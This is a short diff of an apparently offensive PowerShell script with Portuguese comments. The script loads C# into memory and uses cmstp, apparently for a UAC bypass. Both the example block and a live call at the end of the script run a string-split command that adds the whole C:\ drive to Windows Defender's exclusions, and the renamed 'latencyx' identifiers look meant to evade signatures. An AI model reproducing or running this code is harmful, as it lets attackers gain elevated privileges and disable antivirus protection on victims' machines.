@@ -12,7 +12,8 @@ Este script usa código em C# para ser carregado na memória com PowerShell usan
 .PARAMETER Command
 
 .EXAMPLE
-latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
+latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+
 
 #>
 
@@ -191,4 +192,5 @@ if ($latencyxProcess -eq "cmstp") {
 }
 
 # Agora fora da função, você pode chamar diretamente a função com o comando desejado:
-latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
+latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+
